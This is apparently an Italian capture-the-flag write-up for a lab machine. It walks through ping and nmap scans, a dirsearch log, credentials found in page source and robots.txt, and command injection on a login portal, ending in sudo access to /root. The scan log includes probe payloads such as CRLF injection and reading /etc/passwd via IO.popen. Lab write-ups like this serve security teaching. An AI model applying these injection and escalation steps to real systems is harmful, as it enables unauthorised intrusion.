@@ -1,0 +1,149 @@
+ping and scan the target
+
+====================================================================================•x[2023-07-21](04:01)x•
+ PINGING HOST 
+====================================================================================•x[2023-07-21](04:01)x•
+PING 10.10.96.203 (10.10.96.203) 56(84) bytes of data.
+64 bytes from 10.10.96.203: icmp_seq=1 ttl=63 time=49.9 ms
+
+--- 10.10.96.203 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 49.857/49.857/49.857/0.000 ms
+
+
+====================================================================================•x[2023-07-21](04:01)x•
+ RUNNING TCP PORT SCAN 
+====================================================================================•x[2023-07-21](04:01)x•
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-21 04:01 EDT
+Nmap scan report for 10.10.96.203
+Host is up (0.048s latency).
+Not shown: 1 closed tcp port (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 0.30 seconds
+
+controllo la porta 80 dato che la scansione la segnala aperta
+ + -- --=[Port 80 opened... running tests...
+====================================================================================•x[2023-07-21](04:01)x•
+ CHECKING HTTP HEADERS AND METHODS 
+====================================================================================•x[2023-07-21](04:01)x•
+HTTP/1.1 200 OK
+Date: Fri, 21 Jul 2023 08:02:05 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Sun, 10 Feb 2019 16:37:33 GMT
+ETag: "426-5818ccf125686"
+Accept-Ranges: bytes
+Content-Length: 1062
+Vary: Accept-Encoding
+Content-Type: text/html
+
+HTTP/1.1 200 OK
+Date: Fri, 21 Jul 2023 08:02:05 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Last-Modified: Sun, 10 Feb 2019 16:37:33 GMT
+ETag: "426-5818ccf125686"
+Accept-Ranges: bytes
+Content-Length: 1062
+Vary: Accept-Encoding
+Content-Type: text/html
+
+Allow: OPTIONS,GET,HEAD,POST
+
+ottengo le seguenti informazioni dal servizio http
+====================================================================================•x[2023-07-21](04:01)x•
+ GATHERING HTTP INFO 
+====================================================================================•x[2023-07-21](04:01)x•
+http://10.10.96.203:80 [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.96.203], JQuery, Script, Title[Rick is sup4r cool]
+
+====================================================================================•x[2023-07-21](04:02)x•
+ GATHERING WEB FINGERPRINT 
+====================================================================================•x[2023-07-21](04:02)x•
+ Bootstrap 
+ Ubuntu 
+ Apache HTTP Server 2.4.18
+ 
+ sfrutto dirsearch per controllare le varie directory del server
+ 
+ Target: http://10.10.96.203:80/
+
+[04:02:45] Starting: 
+[04:02:46] 200 -    1KB - /%0ASet-Cookie%3Acrlfinjection/..                
+[04:02:47] 200 -    1KB - /?a=/bin/sh+-c+                                  
+[04:02:57] 200 -    2KB - /assets/                                          
+[04:02:57] 200 -    2KB - /assets                                           
+[04:03:27] 200 -    1KB - /index.html                                       
+[04:03:29] 200 -    1KB - /?IO.popen(%27cat%20%2Fetc%2Fpasswd%27).read%0A%23
+[04:03:35] 200 -  882B  - /login.php 
+[04:03:48] 200 -    1KB - /?phpinfo=-1                                      
+[04:03:52] 200 -    1KB - /?pp=env 
+[04:03:55] 200 -    1KB - /?q=admin/views/ajax/autocomplete/user/a          
+[04:03:55] 200 -    1KB - /?q=views/ajax/autocomplete/user/a                
+[04:03:58] 200 -   17B  - /robots.txt 
+ 
+ 
+controllando il codice della pagine index "view-source:http://10.10.96.203/" ho trovato il seguente commento:
+ <!--
+    Note to self, remember username!
+    Username: R1ckRul3s
+  -->
+
+controllando la pagina "view-source:http://10.10.96.203/robots.txt" ottengo il seguente messaggio
+"Wubbalubbadubdub"
+
+invece sotto assets trovo diverse immagini e gif che vado ad analizzare, non contegono nessuna informazioni utile
+
+Mi sposto sulla pagina login.php e provo ad accedere con l'username trovato prima e come password uso il contenuto della pagina robots.txt
+
+Ottengo una pagina in cui posso eseguire dei comandi, provo con ls:
+Sup3rS3cretPickl3Ingred.txt
+assets
+clue.txt
+denied.php
+index.html
+login.php
+portal.php
+robots.txt
+
+visualizzo il contenuto di Sup3rS3cretPickl3Ingred.txt, il comando cat è stato disabilitato, uso strings
+-> "mr. meeseek hair"
+
+controllo anche il contenuto del file clue.txt "Look around the file system for the other ingredient."
+Abbiamo visto che il sito è vulnerabile a command injection perciò come da consiglio provo a controllare in giro per il file sistem
+
+cd /home; ls -al; pwd
+total 16
+drwxr-xr-x  4 root   root   4096 Feb 10  2019 .
+drwxr-xr-x 23 root   root   4096 Jul 21 08:00 ..
+drwxrwxrwx  2 root   root   4096 Feb 10  2019 rick
+drwxr-xr-x  4 ubuntu ubuntu 4096 Feb 10  2019 ubuntu
+/home
+
+scopro la cartella home, l'utente rick e ubuntu -> controllo sotto rick
+total 12
+drwxrwxrwx 2 root root 4096 Feb 10  2019 .
+drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
+-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
+/home/rick
+
+ottengo il secondo ingrediente tramite il comando "less /home/rick/"second ingredients"": 1 jerry tear
+
+per l'ultimo ingrediente suppongo si debbano avere dei privilegi superiori perciò controllo che comandi si possono eseguire al nostro livello tramite "sudo -l" 
+
+Matching Defaults entries for www-data on ip-10-10-96-203.eu-west-1.compute.internal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-96-203.eu-west-1.compute.internal:
+    (ALL) NOPASSWD: ALL
+    
+dato che posso eseguire qualsiasi comando, vado a visualizzare il contenuto della cartella root "sudo ls -lah /root"
+total 28K
+drwx------  4 root root 4.0K Feb 10  2019 .
+drwxr-xr-x 23 root root 4.0K Jul 21 08:00 ..
+-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root 4.0K Feb 10  2019 .ssh
+-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
+drwxr-xr-x  3 root root 4.0K Feb 10  2019 snap
+
+sudo less /root/3rd.txt -> fleeb juice
